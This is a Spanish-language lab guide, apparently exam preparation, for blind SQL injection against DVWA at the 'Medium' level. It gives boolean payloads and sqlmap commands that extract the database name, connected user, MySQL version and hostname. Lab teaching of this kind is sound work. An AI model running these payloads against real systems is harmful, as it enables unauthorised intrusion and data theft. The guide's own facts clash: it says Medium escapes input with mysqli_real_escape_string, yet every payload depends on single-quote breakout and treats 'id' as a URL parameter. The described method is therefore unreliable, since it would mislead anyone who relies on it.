# SQL Injection Blind - Guía Práctica
## DVWA - Nivel Medium

---

## 🎯 Objetivo

Explotar la vulnerabilidad de **SQL Injection Blind** en DVWA para:
1. Extraer el **nombre de la base de datos**
2. Extraer el **usuario conectado**
3. Documentar el proceso con capturas de pantalla

---

## 📋 Requisitos Previos

- [x] DVWA instalado y corriendo
- [x] Configuración de seguridad: **Medium**
- [x] Módulo: **SQL Injection (Blind)**
- [x] Navegador web (Chrome/Firefox/Edge)
- [x] Burp Suite o herramienta similar (opcional, para interceptar peticiones)

---

## 🔍 Fase 1: Identificar el Parámetro Vulnerable

### Paso 1.1: Acceder al módulo
```
URL: http://localhost/dvwa/vulnerabilities/sqli_blind/
```

### Paso 1.2: Analizar el formulario
El formulario típicamente tiene un campo de entrada para **User ID**.

### Paso 1.3: Probar payloads básicos

**Payload 1 - Prueba Normal:**
```
1
```
**Resultado esperado:** Mensaje "User ID exists in the database."

**Payload 2 - Prueba con comilla simple:**
```
1'
```
**Resultado esperado:** En nivel Medium, puede que no muestre error pero la respuesta cambiará.

**Payload 3 - Prueba TRUE:**
```
1' AND '1'='1
```
**Resultado esperado:** "User ID exists in the database." (TRUE)

**Payload 4 - Prueba FALSE:**
```
1' AND '1'='2
```
**Resultado esperado:** "User ID is MISSING from the database." (FALSE)

✅ **Si las respuestas son diferentes entre TRUE y FALSE, el parámetro es vulnerable a SQL Injection Blind.**

---

## 🗄️ Fase 2: Extraer el Nombre de la Base de Datos

### Método 1: Usando SUBSTRING + ASCII

**Concepto:** Extraer carácter por carácter comparando valores ASCII.

**Payload Base:**
```sql
1' AND SUBSTRING(database(),1,1)='d
```

**Proceso sistemático:**

1. **Encontrar la longitud del nombre de la BD:**
```sql
1' AND LENGTH(database())=1  -- FALSE
1' AND LENGTH(database())=2  -- FALSE
1' AND LENGTH(database())=3  -- FALSE
1' AND LENGTH(database())=4  -- TRUE (si la BD es "dvwa")
```

2. **Extraer primer carácter:**
```sql
1' AND SUBSTRING(database(),1,1)='a' -- FALSE
1' AND SUBSTRING(database(),1,1)='b' -- FALSE
...
1' AND SUBSTRING(database(),1,1)='d' -- TRUE ✓
```

3. **Extraer segundo carácter:**
```sql
1' AND SUBSTRING(database(),2,1)='v' -- TRUE ✓
```

4. **Extraer tercer carácter:**
```sql
1' AND SUBSTRING(database(),3,1)='w' -- TRUE ✓
```

5. **Extraer cuarto carácter:**
```sql
1' AND SUBSTRING(database(),4,1)='a' -- TRUE ✓
```

**Resultado:** Base de datos = **`dvwa`**

### Método 2: Usando comparación directa (más rápido)

```sql
1' AND database()='dvwa
```
Si retorna TRUE, confirmamos que la BD es "dvwa".

---

## 👤 Fase 3: Extraer el Usuario Conectado

### Payload Base:
```sql
1' AND SUBSTRING(user(),1,1)='r
```

**Proceso:**

1. **Encontrar la longitud del usuario:**
```sql
1' AND LENGTH(user())=1  -- FALSE
1' AND LENGTH(user())=4  -- FALSE
...
1' AND LENGTH(user())=14 -- TRUE (si es "root@localhost")
```

2. **Extraer caracteres uno por uno:**

**Posición 1:**
```sql
1' AND SUBSTRING(user(),1,1)='r' -- TRUE ✓
```

**Posición 2:**
```sql
1' AND SUBSTRING(user(),2,1)='o' -- TRUE ✓
```

**Posición 3:**
```sql
1' AND SUBSTRING(user(),3,1)='o' -- TRUE ✓
```

**Posición 4:**
```sql
1' AND SUBSTRING(user(),4,1)='t' -- TRUE ✓
```

**Posición 5:**
```sql
1' AND SUBSTRING(user(),5,1)='@' -- TRUE ✓
```

Continuar hasta completar...

**Resultado típico:** Usuario = **`root@localhost`**

### Método alternativo - Comparación directa:

```sql
1' AND user()='root@localhost
```

---

## 🔢 Fase 4: Información Adicional del Sistema

### Extraer la versión de MySQL:
```sql
1' AND SUBSTRING(version(),1,1)='5' -- Si es MySQL 5.x
1' AND SUBSTRING(version(),1,1)='8' -- Si es MySQL 8.x
```

### Extraer el nombre del servidor:
```sql
1' AND SUBSTRING(@@hostname,1,1)='l'
```

---

## 🛠️ Herramientas de Automatización (Opcional)

### SQLMap
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=tu_session_id; security=medium" \
       --dbs
```

**Para extraer el usuario:**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=tu_session_id; security=medium" \
       --current-user
```

---

## 📸 Capturas Requeridas

Para cumplir con la rúbrica, asegúrate de capturar:

1. ✅ **DVWA configurado en nivel Medium**
   - Captura del menú DVWA Security mostrando "Security Level: medium"

2. ✅ **Página SQL Injection (Blind)**
   - Captura de la URL: `http://localhost/dvwa/vulnerabilities/sqli_blind/`

3. ✅ **Identificación del parámetro vulnerable**
   - Capturas mostrando respuestas diferentes entre TRUE y FALSE
   - Ej: `1' AND '1'='1` vs `1' AND '1'='2`

4. ✅ **Extracción del nombre de la base de datos**
   - Capturas del proceso de extracción carácter por carácter
   - O captura final mostrando: `1' AND database()='dvwa` retornando TRUE

5. ✅ **Extracción del usuario conectado**
   - Capturas del proceso de extracción
   - O captura final mostrando: `1' AND user()='root@localhost` retornando TRUE

6. ✅ **Pantalla completa en todas las capturas**
   - Debe verse la barra de direcciones completa
   - Debe verse la hora/fecha del sistema

---

## 💡 Tips para el Examen

1. **Organiza tus capturas:** Nómbralas secuencialmente (captura_01.png, captura_02.png, etc.)

2. **Documenta cada paso:** Anota en un documento Word/PDF qué payload usaste en cada captura

3. **Verifica la configuración:** Antes de empezar, confirma que DVWA está en nivel "medium"

4. **Tiempo:** El proceso manual puede tomar 15-20 minutos. SQLMap lo hace en 2-3 minutos

5. **Alternativas:** Si no tienes DVWA instalado localmente, puedes usar:
   - DVWA en Docker: `docker run --rm -it -p 80:80 vulnerables/web-dvwa`
   - Máquina virtual con DVWA preinstalado

---

## 🎓 Resumen de Resultados Esperados

| Dato | Valor Esperado |
|------|----------------|
| **Base de Datos** | `dvwa` |
| **Usuario** | `root@localhost` (o `dvwa@localhost`) |
| **Versión MySQL** | `5.x` o `8.x` (depende de tu instalación) |
| **Parámetro Vulnerable** | `id` en la URL |

---

## ⚠️ Notas Importantes

- En nivel **Medium**, DVWA usa **mysqli_real_escape_string()** pero aún es vulnerable si se explotan ciertos patrones
- En nivel **High**, necesitarás técnicas más avanzadas
- **NUNCA** uses estas técnicas en sistemas de producción sin autorización

---

**Siguiente paso:** Ver `MEDIDAS_SEGURIDAD.md` para completar la parte 3 de la pregunta (medidas de seguridad).
